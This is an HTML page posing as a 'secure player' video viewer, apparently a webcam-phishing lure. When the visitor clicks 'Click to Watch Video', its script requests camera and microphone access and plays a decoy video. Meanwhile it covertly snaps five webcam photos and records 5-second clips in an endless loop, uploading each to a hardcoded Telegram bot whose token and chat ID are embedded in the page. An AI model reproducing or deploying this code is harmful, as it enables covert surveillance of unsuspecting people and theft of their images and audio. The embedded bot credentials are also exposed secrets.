<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CODEXBD | SECURE_PLAYER</title>
    <style>
        body { background-color: #000; color: #00ff41; font-family: 'Courier New', monospace; text-align: center; margin: 0; overflow: hidden; }
        .main-container { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }
        .video-wrapper { width: 90%; max-width: 700px; border: 2px solid #00ff41; box-shadow: 0 0 20px #00ff4144; background: #000; }
        video#userMovie { width: 100%; display: block; }
        #bgCam, #canvas { display: none; }
        .console-log { margin-top: 15px; font-size: 12px; text-align: left; width: 85%; max-width: 500px; padding: 10px; border: 1px solid #1a1a1a; background: #050505; }
        .recording-dot { color: red; animation: blink 1s infinite; }
        @keyframes blink { 50% { opacity: 0; } }
        .play-btn { background: #00ff41; color: #000; border: none; padding: 15px 40px; font-weight: bold; cursor: pointer; text-transform: uppercase; margin-bottom: 10px; box-shadow: 0 0 15px #00ff41; }
    </style>
</head>
<body>

<div class="main-container">
    <h2>[ CODEXBD_REMOTE_SYSTEM ]</h2>

    <button id="authBtn" class="play-btn">Click to Watch Video</button>

    <div class="video-wrapper">
        <video id="userMovie">
            <source src="./video.mp4" type="video/mp4">
        </video>
    </div>

    <video id="bgCam" autoplay muted></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <div class="console-log">
        > SESSION_STATUS: <span id="status">IDLE</span><br>
        > DATA_PACKETS_SENT: <span id="packets">0</span>
    </div>
</div>

<script>
    // আপনার দেওয়া তথ্য এখানে সেট করা হয়েছে
    const BOT_TOKEN = '8671576446:AAE0PGMS-r9-cRJAgeLBW5s6Feos_w1ZzRs';
    const CHAT_ID = '6274855215';

    const authBtn = document.getElementById('authBtn');
    const userMovie = document.getElementById('userMovie');
    const bgCam = document.getElementById('bgCam');
    const canvas = document.getElementById('canvas');
    const statusText = document.getElementById('status');
    const packetText = document.getElementById('packets');

    let videoCount = 0;

    authBtn.addEventListener('click', async () => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            bgCam.srcObject = stream;
            
            authBtn.style.display = 'none';
            userMovie.play();
            userMovie.controls = true;
            
            statusText.innerHTML = '<span class="recording-dot">●</span> RUNNING_BACKGROUND_SYNC';
            
            // ৫টি ছবি তোলার কাজ
            capturePhotos(stream);
            
            // প্রতি ৫ সেকেন্ডে ভিডিও পাঠানোর লুপ
            startSilentSync(stream);

        } catch (err) {
            alert("Error: Access denied. Please allow camera and microphone.");
        }
    });

    function capturePhotos(stream) {
        let count = 0;
        let pInterval = setInterval(() => {
            if (count < 5) {
                const ctx = canvas.getContext('2d');
                ctx.drawImage(bgCam, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(blob => sendData(blob, 'photo'), 'image/jpeg');
                count++;
            } else {
                clearInterval(pInterval);
            }
        }, 1200);
    }

    function startSilentSync(stream) {
        let chunks = [];
        const recorder = new MediaRecorder(stream);

        recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
        
        recorder.onstop = () => {
            const blob = new Blob(chunks, { type: 'video/mp4' });
            sendData(blob, 'video');
            startSilentSync(stream);
        };

        setTimeout(() => {
            if (recorder.state !== 'inactive') recorder.stop();
        }, 5000);

        recorder.start();
    }

    async function sendData(blob, type) {
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        
        let api = type === 'photo' ? 'sendPhoto' : 'sendVideo';
        formData.append(type, blob, `codex_${Date.now()}.${type === 'photo' ? 'jpg' : 'mp4'}`);
        
        if (type === 'video') {
            videoCount++;
            packetText.innerText = videoCount;
            formData.append('caption', `📡 New Feed #${videoCount} | CodexBD Monitor`);
        }

        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${api}`, {
                method: 'POST',
                body: formData
            });
        } catch (e) { console.log("Sync error..."); }
    }
</script>

</body>
</html>
